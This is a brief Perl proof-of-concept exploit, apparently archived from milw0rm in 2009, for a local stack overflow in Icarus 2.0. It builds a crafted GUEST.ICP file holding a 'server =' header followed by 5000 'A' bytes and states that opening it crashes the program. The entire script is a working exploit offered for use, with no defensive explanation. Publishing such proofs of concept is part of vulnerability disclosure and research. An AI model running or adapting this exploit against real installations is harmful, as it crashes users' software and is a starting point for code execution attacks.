#!/usr/bin/perl
#Icarus 2.0(GUEST.ICP) Local Stack Overflow PoC
#By ThE g0bL!N
#usage: After Clicking On Perl File  Run The Program And Choose Continue  Booom The Program Crashed :)
################################################################
$Header="\x73\x65\x72\x76\x65\x72\x20\x3D" ;
$junk="\x41" x 5000 ;
###################################################################
open(myfile,'>>GUEST.ICP');
print myfile $Header.$junk;
###################################################################

# milw0rm.com [2009-07-14]
